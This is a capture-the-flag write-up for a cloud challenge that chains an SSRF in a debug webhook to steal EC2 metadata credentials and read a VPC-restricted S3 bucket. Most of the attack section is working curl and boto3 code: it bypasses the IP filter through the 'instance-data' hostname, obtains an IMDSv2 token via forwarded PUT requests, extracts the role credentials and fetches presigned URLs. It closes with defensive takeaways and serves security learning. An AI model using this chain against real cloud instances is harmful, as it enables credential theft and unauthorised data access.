# [06] The Cloud — Writeup

**Points:** 500
**Category:** Cloud
**Flag:** `FAM{cl0ud_ssrf_imds_b35ab042ddbd}`

## Challenge

> An internal DevOps monitoring dashboard was accidentally deployed with debug endpoints enabled on a public-facing EC2 instance. The platform team stores sensitive configuration in an S3 bucket. Your goal: get the flag from the bucket.
>
> hint: debug endpoints reveal more than intended. The instance knows who it is.

Target: `http://3.108.218.253/` (per-player EC2 instance, unique IAM role + S3 prefix).

## Recon

`http://<ip>/` is a Flask/Werkzeug "NexOps Dashboard". `/metrics/endpoints` lists routes; `/metrics/config` leaks the whole design:

```json
{"identity":{"imds":"http://169.254.169.254/latest/meta-data/iam/security-credentials/",...},
 "storage":{"backend":"s3","bucket":"fam-ctf-cloud-challenge","prefix":"players/1188",
            "region":"ap-south-1","note":"bucket access restricted to requests originating from within vpc"},
 "flags":{"webhook_enabled":true}}
```

Key facts: SSRF-able `POST /internal/webhook?url=`, IMDS is the target, bucket `fam-ctf-cloud-challenge`, prefix `players/1188`, and **bucket access is restricted to requests originating from within the VPC**.

## The webhook (SSRF)

`GET/POST/PUT /internal/webhook?url=<target>` fetches a URL, but with an allowlist:
`169.254.x.x` and `*.amazonaws.com`.

### Bypassing the IP filter — "the instance has a name"
Pointing directly at `169.254.169.254` is blocked:
`{"error":"Direct access to internal IP ranges is not allowed.","hint":"...The instance has a name."}`

AWS aliases the metadata service to the hostname **`instance-data`**, which isn't caught by the IP filter:
```
POST /internal/webhook?url=http://instance-data/latest/meta-data/iam/security-credentials/
```
→ HTTP **401** (IMDSv2 enforced — a session token is required).

### Defeating IMDSv2
IMDSv2 needs `PUT /latest/api/token` with header `X-aws-ec2-metadata-token-ttl-seconds`. Crucially, **the webhook forwards both the HTTP method and request headers** to the target. So:

```bash
# 1) get a session token (PUT is forwarded, TTL header is forwarded)
curl -X PUT "http://<ip>/internal/webhook?url=http://instance-data/latest/api/token" \
     -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
# -> {"body":"AQAE...","status":200}

# 2) use the token to read the role, then the credentials
curl "http://<ip>/internal/webhook?url=http://instance-data/latest/meta-data/iam/security-credentials/" \
     -H "X-aws-ec2-metadata-token: <TOKEN>"
# -> ctf-cloud-player-1188
curl "http://<ip>/internal/webhook?url=.../security-credentials/ctf-cloud-player-1188" \
     -H "X-aws-ec2-metadata-token: <TOKEN>"
# -> AccessKeyId / SecretAccessKey / Token (temporary role creds)
```

## Using the credentials — VPC restriction

The stolen creds **do not work from the laptop**: `aws sts get-caller-identity` and any direct S3 call return `SignatureDoesNotMatch` (clock was verified in sync — the creds/bucket policy only honor requests from inside the VPC / via the instance).

The fix is to **presign S3 requests locally, then fetch the presigned URL through the webhook** — so the actual HTTP request to `*.amazonaws.com` originates from the instance (inside the VPC). Presigning is done offline with the creds; only the final GET has to come from within the VPC, which the SSRF provides.

```python
import json,requests,boto3
from botocore.client import Config
c=json.load(open("creds.json"))
s3=boto3.client("s3",region_name="ap-south-1",
    aws_access_key_id=c["AccessKeyId"],aws_secret_access_key=c["SecretAccessKey"],
    aws_session_token=c["Token"],config=Config(signature_version="s3v4"))

# enumerate the prefix
u=s3.generate_presigned_url("list_objects_v2",
    Params={"Bucket":"fam-ctf-cloud-challenge","Prefix":"players/1188/"},ExpiresIn=600)
print(requests.get("http://<ip>/internal/webhook",params={"url":u}).json())
# -> Key: players/1188/flag.txt

# read the flag object
u=s3.generate_presigned_url("get_object",
    Params={"Bucket":"fam-ctf-cloud-challenge","Key":"players/1188/flag.txt"},ExpiresIn=600)
print(requests.get("http://<ip>/internal/webhook",params={"url":u}).json()["body"])
# -> FAM{cl0ud_ssrf_imds_b35ab042ddbd}
```

## Attack chain (summary)
1. Leak config via debug endpoint → identify SSRF webhook + IMDS + S3 target.
2. SSRF filter bypass: use hostname `instance-data` instead of `169.254.169.254`.
3. IMDSv2: webhook forwards method+headers → `PUT .../api/token`, then read role creds.
4. Creds are VPC-scoped → presign S3 list/get locally and fetch the presigned `*.amazonaws.com` URL **through the webhook** so the request originates inside the VPC.
5. Read `players/1188/flag.txt`.

## Tools used
- **curl / Python `requests`** — recon and driving the SSRF chain.
- **boto3 / botocore** — presigning S3 requests offline with the stolen role credentials.
- No AWS CLI network access to S3 was needed (and wouldn't have worked — VPC-restricted).

## Key takeaways
- Debug/metrics endpoints that echo IAM/IMDS config are a full roadmap for an attacker.
- Blocking the literal IMDS IP is insufficient — the `instance-data` hostname (and encoded-IP variants) reach the same service. Pin an allowlist by resolved IP, not string matching, and enforce IMDSv2 *and* hop-limit 1.
- A URL-fetch "webhook" that forwards arbitrary methods/headers turns IMDSv2's PUT-token requirement into a non-obstacle.
- VPC-only bucket policies don't help if a confused-deputy service inside the VPC will fetch attacker-supplied (presigned) URLs for you.
